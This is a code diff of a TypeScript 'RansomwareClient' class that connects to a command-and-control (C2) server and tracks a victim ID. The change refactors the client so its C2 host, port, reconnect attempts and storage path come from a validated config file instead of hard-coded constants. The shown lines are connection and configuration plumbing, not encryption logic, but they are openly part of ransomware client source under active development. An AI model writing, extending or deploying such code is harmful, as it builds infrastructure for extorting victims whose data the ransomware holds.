@@ -9,6 +9,12 @@ import {
     ServerMessage,
     SERVER_CONFIG
 } from '../types/communication'
+import {
+    ClientConfig,
+    loadClientConfig,
+    validateClientConfig,
+    DEFAULT_CLIENT_CONFIG
+} from './clientConfig'
 
 // Client class to handle communication with the C2 server
 export class RansomwareClient {
@@ -16,17 +22,30 @@ export class RansomwareClient {
     private connected = false
     private reconnecting = false
     private reconnectAttempts = 0
-    private maxReconnectAttempts = 5
-
-    // Store essential information for reconnection
+    private config: ClientConfig    // Store essential information for reconnection
     private victimId: string | null = null
     private lastInitTime: number | null = null
 
-    // Local storage file for client information
-    private readonly CLIENT_INFO_PATH = './client_connection.json'
+    // Path for storing client connection info, derived from config
+    private get CLIENT_INFO_PATH(): string {
+        return path.resolve(this.config.clientInfoPath);
+    }
 
-    // Constructor
-    constructor() {
+    // Max reconnect attempts, derived from config
+    private get maxReconnectAttempts(): number {
+        return this.config.maxReconnectAttempts;
+    }
+
+    // Constructor - accepts optional config path
+    constructor(configPath?: string) {
+        this.config = loadClientConfig(configPath)
+        
+        // Validate configuration (already handled by loadClientConfig, but good for direct use)
+        if (!validateClientConfig(this.config)) {
+            console.warn('[*] Using default configuration due to validation errors in loaded config.')
+            this.config = DEFAULT_CLIENT_CONFIG // Fallback just in case
+        }
+        
         this.setupSocket()
         this.loadStoredClientInfo()
     }
@@ -125,10 +144,9 @@ export class RansomwareClient {
             this.socket!.once('error', () => {
                 clearTimeout(timeout)
                 resolve(false)
-            })
-            // Attempt connection
+            })            // Attempt connection
             try {
-                this.socket!.connect(SERVER_CONFIG.PORT, SERVER_CONFIG.HOST)
+                this.socket!.connect(this.config.port, this.config.host)
             } catch (error) {
                 console.error('[-] Failed to initiate connection:', error)
                 clearTimeout(timeout)
